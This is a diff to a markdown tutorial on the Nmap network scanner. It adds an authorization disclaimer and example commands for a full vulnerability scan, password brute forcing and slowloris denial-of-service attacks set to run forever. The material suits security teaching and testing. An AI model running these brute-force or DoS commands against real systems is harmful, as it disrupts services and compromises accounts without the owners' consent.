@@ -3,7 +3,9 @@
 [Nmap](https://nmap.org/) (i.e., "Network Mapper") is a powerful open-source network scanning and exploration tool designed to discover hosts, services, and vulnerabilities on a computer network.
 
 Nmap can identify the operating system of a target host as well as versions of services running on open ports based on characteristics of the network responses; information that is valuable for identifying potential vulnerabilities.
-Nmap also allows users ability to execute custom scripts to automate tasks, conduct more advanced tests, or perform specific checks (e.g., vulnerability detection).
+Nmap also allows users ability to execute custom scripts to automate tasks, conduct more advanced tests, or perform specific checks (e.g., vulnerability detection). One can also leverage Nmap to launch DOS attacks. 
+
+*Note: It is important to obtain prior authorization before scanning a target network or system.*
 
 <hr>
 
@@ -66,6 +68,7 @@ Example Scripts:
 
 #### Example Scripts 
 
+Vulnerability Scan:
 ```
 nmap -Pn -sV -sC -vvv -p- <target>
 
@@ -80,4 +83,20 @@ nmap -Pn -sV -sC -vvv -p- <target>
 -p-: Full port scan; instructs Nmap to scan all 65,535 ports on the target. 
 
 target: IP Address/Domain Name of target system.
+```
+
+Brute Force Passwords: 
+```
+nmap --script brute -Pn <target>
+```
+
+DOS Scan & Attack: 
+```
+nmap --script vuln,dos -Pn <target>
+
+* use -Pn in case the target blocks ping probes.
+
+nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true <target>
+
+nmap -T5 -Pn --script http-slowloris --script-args http-slowloris.runforever=true <target>
 ```
